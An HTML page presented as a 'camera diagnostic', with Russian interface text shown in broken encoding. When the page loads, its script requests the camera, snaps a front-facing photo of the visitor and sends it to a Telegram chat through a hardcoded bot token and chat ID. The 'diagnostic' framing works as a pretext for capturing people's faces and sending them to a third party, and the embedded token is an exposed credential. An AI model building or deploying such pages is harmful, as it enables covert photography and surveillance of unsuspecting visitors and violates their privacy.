<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Camera Diagnostic</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            padding: 20px; 
            background: #000; 
            color: #0f0;
            text-align: left;
            margin: 0;
        }
        .status { 
            margin: 10px 0; 
            padding: 10px; 
            border-radius: 5px; 
            border-left: 4px solid #333;
            word-break: break-word;
        }
        .waiting { 
            background: #111; 
            border-left-color: #333;
        }
        .success { 
            background: #0d3a0d; 
            border-left-color: #0f0;
        }
        .error { 
            background: #3a0d0d; 
            color: #f00;
            border-left-color: #f00;
        }
        #log {
            max-width: 800px;
            margin: 0 auto;
            font-size: 14px;
        }
        h2 {
            text-align: center;
            margin-bottom: 30px;
            color: #0f0;
        }
        /* –°–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ –Ω–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã */
        #preview { display: none; }
    </style>
</head>
<body>
    <div id="log">
        <h2>üì± –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ –∫–∞–º–µ—Ä—ã</h2>
        <div class="status waiting" id="status-start">üîÑ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
    </div>

<script>
// === –ù–ê–°–¢–†–û–ô–ö–ò ===
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
// ================

const log = document.getElementById('log');
const startStatus = document.getElementById('status-start');

function addLog(message, type = 'waiting') {
    const div = document.createElement('div');
    div.className = `status ${type}`;
    div.textContent = `[${new Date().toLocaleTimeString().slice(0,8)}] ${message}`;
    log.appendChild(div);
    console.log(`[${type}] ${message}`); // –î–ª—è –∫–æ–Ω—Å–æ–ª–∏
}

async function runDiagnostic() {
    let stream = null;
    
    try {
        // –û–±–Ω–æ–≤–ª—è–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–π —Å—Ç–∞—Ç—É—Å
        startStatus.textContent = '[00:00:00] 1. –ü—Ä–æ–≤–µ—Ä—è—é –ø–æ–¥–¥–µ—Ä–∂–∫—É –∫–∞–º–µ—Ä—ã...';
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –∫–∞–º–µ—Ä—ã
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            throw new Error('–ë—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç getUserMedia API');
        }
        
        addLog('‚úÖ API –∫–∞–º–µ—Ä—ã –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è', 'success');
        addLog('2. –ó–∞–ø—Ä–∞—à–∏–≤–∞—é –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ...', 'waiting');
        
        // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
        let cameraType = 'front';
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
            addLog('‚úÖ –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞ –¥–æ—Å—Ç—É–ø–Ω–∞', 'success');
        } catch (frontError) {
            addLog('‚ö†Ô∏è –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞', 'waiting');
            addLog('3. –ü—Ä–æ–±—É—é –∑–∞–¥–Ω—é—é –∫–∞–º–µ—Ä—É...', 'waiting');
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment' }
                });
                cameraType = 'back';
                addLog('‚úÖ –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –¥–æ—Å—Ç—É–ø–Ω–∞', 'success');
            } catch (backError) {
                throw new Error(`–û–±–µ –∫–∞–º–µ—Ä—ã –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã. –ü–µ—Ä–µ–¥–Ω—è—è: ${frontError.message}, –ó–∞–¥–Ω—è—è: ${backError.message}`);
            }
        }
        
        // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–∞–º–µ—Ä–µ
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        
        // –ñ–¥—ë–º –∑–∞–≥—Ä—É–∑–∫–∏ –≤–∏–¥–µ–æ
        addLog('4. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É—é –∫–∞–º–µ—Ä—É...', 'waiting');
        await new Promise((resolve, reject) => {
            video.onloadedmetadata = () => {
                addLog(`‚úÖ –ö–∞–º–µ—Ä–∞ –≥–æ—Ç–æ–≤–∞. –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${video.videoWidth}x${video.videoHeight}`, 'success');
                resolve();
            };
            video.onerror = () => reject(new Error('–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∫–∞–º–µ—Ä—ã'));
            setTimeout(() => reject(new Error('–¢–∞–π–º–∞—É—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∫–∞–º–µ—Ä—ã')), 10000);
        });
        
        // –¢–µ—Å—Ç —Ñ–æ–∫—É—Å–∏—Ä–æ–≤–∫–∏
        addLog('5. –¢–µ—Å—Ç–∏—Ä—É—é —Ñ–æ–∫—É—Å–∏—Ä–æ–≤–∫—É (3 —Å–µ–∫—É–Ω–¥—ã)...', 'waiting');
        for (let i = 3; i > 0; i--) {
            addLog(`   –û—Å—Ç–∞–ª–æ—Å—å: ${i} —Å–µ–∫...`, 'waiting');
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        
        // –¢–µ—Å—Ç —Å—ä—ë–º–∫–∏
        addLog('6. –¢–µ—Å—Ç–∏—Ä—É—é —Å—ä—ë–º–∫—É...', 'waiting');
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        // –î–µ–ª–∞–µ–º —Ç–µ—Å—Ç–æ–≤—ã–π —Å–Ω–∏–º–æ–∫
        ctx.drawImage(video, 0, 0);
        stream.getTracks().forEach(track => track.stop());
        
        // –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –∫–∞—á–µ—Å—Ç–≤–æ —Ñ–æ—Ç–æ
        const testArea = ctx.getImageData(0, 0, 10, 10);
        const data = testArea.data;
        let brightnessSum = 0;
        let pixelCount = 0;
        
        for (let i = 0; i < data.length; i += 4) {
            const brightness = 0.299 * data[i] + 0.587 * data[i + 1] + 0.114 * data[i + 2];
            if (brightness > 10) {
                brightnessSum += brightness;
                pixelCount++;
            }
        }
        
        const avgBrightness = pixelCount > 0 ? brightnessSum / pixelCount : 0;
        
        if (avgBrightness > 50) {
            addLog(`‚úÖ –§–æ—Ç–æ —Ö–æ—Ä–æ—à–µ–≥–æ –∫–∞—á–µ—Å—Ç–≤–∞ (—è—Ä–∫–æ—Å—Ç—å: ${avgBrightness.toFixed(1)})`, 'success');
        } else if (avgBrightness > 20) {
            addLog(`‚ö†Ô∏è –§–æ—Ç–æ —Ç—ë–º–Ω–æ–µ (—è—Ä–∫–æ—Å—Ç—å: ${avgBrightness.toFixed(1)})`, 'waiting');
        } else {
            addLog(`‚ùå –§–æ—Ç–æ —Å–ª–∏—à–∫–æ–º —Ç—ë–º–Ω–æ–µ (—è—Ä–∫–æ—Å—Ç—å: ${avgBrightness.toFixed(1)})`, 'error');
        }
        
        // –¢–µ—Å—Ç –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        addLog('7. –¢–µ—Å—Ç–∏—Ä—É—é –æ—Ç–ø—Ä–∞–≤–∫—É –≤ Telegram...', 'waiting');
        
        canvas.toBlob(async (blob) => {
            if (!blob) {
                throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ');
            }
            
            addLog(`   –†–∞–∑–º–µ—Ä —Ñ–æ—Ç–æ: ${Math.round(blob.size/1024)} –ö–ë`, 'waiting');
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'diagnostic_test.jpg');
            formData.append('caption', `–î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ –∫–∞–º–µ—Ä—ã\n–¢–∏–ø: ${cameraType === 'front' ? '–§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è' : '–ó–∞–¥–Ω—è—è'}\n–†–∞–∑–º–µ—Ä: ${canvas.width}x${canvas.height}\n–Ø—Ä–∫–æ—Å—Ç—å: ${avgBrightness.toFixed(1)}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    addLog('‚úÖ –§–æ—Ç–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram!', 'success');
                    addLog(`‚úÖ ID —Å–æ–æ–±—â–µ–Ω–∏—è: ${result.result.message_id}`, 'success');
                    
                    // –ò—Ç–æ–≥–æ–≤—ã–π —Å—Ç–∞—Ç—É—Å
                    setTimeout(() => {
                        const finalStatus = document.createElement('div');
                        finalStatus.className = 'status success';
                        finalStatus.textContent = '‚úÖ –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ! –ú–æ–∂–Ω–æ –∑–∞–∫—Ä—ã—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É.';
                        finalStatus.style.cssText = 'text-align: center; font-size: 16px; padding: 20px; margin-top: 30px;';
                        log.appendChild(finalStatus);
                    }, 1000);
                    
                } else {
                    throw new Error(`–û—à–∏–±–∫–∞ Telegram: ${result.description || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}`);
                }
            } catch (fetchError) {
                throw new Error(`–û—à–∏–±–∫–∞ —Å–µ—Ç–∏: ${fetchError.message}`);
            }
        }, 'image/jpeg', 0.8);
        
    } catch (error) {
        // –î–µ—Ç–∞–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –æ—à–∏–±–∫–µ
        addLog(`‚ùå –û–®–ò–ë–ö–ê: ${error.message}`, 'error');
        
        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É –ø—Ä–∏ –æ—à–∏–±–∫–µ
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        
        // –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ —Ç–∏–ø–∞ –æ—à–∏–±–∫–∏
        addLog('üîç –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ –æ—à–∏–±–∫–∏:', 'waiting');
        
        if (error.name === 'NotAllowedError') {
            addLog('   ‚Ä¢ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–∞–∑–∞–ª –≤ –¥–æ—Å—Ç—É–ø–µ –∫ –∫–∞–º–µ—Ä–µ', 'error');
            addLog('   ‚Ä¢ –†–µ—à–µ–Ω–∏–µ: –†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±—Ä–∞—É–∑–µ—Ä–∞', 'waiting');
        } else if (error.name === 'NotFoundError') {
            addLog('   ‚Ä¢ –ö–∞–º–µ—Ä–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞', 'error');
            addLog('   ‚Ä¢ –†–µ—à–µ–Ω–∏–µ: –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –∫–∞–º–µ—Ä–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞ –∏ —Ä–∞–±–æ—Ç–∞–µ—Ç', 'waiting');
        } else if (error.name === 'NotReadableError') {
            addLog('   ‚Ä¢ –ö–∞–º–µ—Ä–∞ —É–∂–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥—Ä—É–≥–∏–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º', 'error');
            addLog('   ‚Ä¢ –†–µ—à–µ–Ω–∏–µ: –ó–∞–∫—Ä–æ–π—Ç–µ –¥—Ä—É–≥–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –∏—Å–ø–æ–ª—å–∑—É—é—â–∏–µ –∫–∞–º–µ—Ä—É', 'waiting');
        } else if (error.name === 'OverconstrainedError') {
            addLog('   ‚Ä¢ –ó–∞–ø—Ä–æ—à–µ–Ω–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∫–∞–º–µ—Ä—ã –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è', 'error');
            addLog('   ‚Ä¢ –†–µ—à–µ–Ω–∏–µ: –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥–æ–π –±—Ä–∞—É–∑–µ—Ä –∏–ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ', 'waiting');
        } else if (error.name === 'AbortError' || error.message.includes('timeout')) {
            addLog('   ‚Ä¢ –ü—Ä–µ–≤—ã—à–µ–Ω–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è', 'error');
            addLog('   ‚Ä¢ –†–µ—à–µ–Ω–∏–µ: –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ', 'waiting');
        } else if (error.message.includes('Telegram')) {
            addLog('   ‚Ä¢ –ü—Ä–æ–±–ª–µ–º–∞ —Å Telegram API', 'error');
            addLog('   ‚Ä¢ –†–µ—à–µ–Ω–∏–µ: –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ç–æ–∫–µ–Ω –±–æ—Ç–∞ –∏ –Ω–∞–ø–∏—à–∏—Ç–µ –µ–º—É /start', 'waiting');
        } else {
            addLog(`   ‚Ä¢ –¢–∏–ø –æ—à–∏–±–∫–∏: ${error.name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}`, 'error');
            addLog('   ‚Ä¢ –†–µ—à–µ–Ω–∏–µ: –û–±–Ω–æ–≤–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞', 'waiting');
        }
        
        // –§–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø—Ä–∏ –æ—à–∏–±–∫–µ
        setTimeout(() => {
            const errorFinal = document.createElement('div');
            errorFinal.className = 'status error';
            errorFinal.textContent = '‚ùå –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ —Å –æ—à–∏–±–∫–∞–º–∏. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Ç–µ–∫—Å—Ç –≤—ã—à–µ –∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –º–Ω–µ.';
            errorFinal.style.cssText = 'text-align: center; font-size: 16px; padding: 20px; margin-top: 30px;';
            log.appendChild(errorFinal);
        }, 1000);
    }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫—É –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏
window.addEventListener('DOMContentLoaded', runDiagnostic);
</script>
</body>
</html>
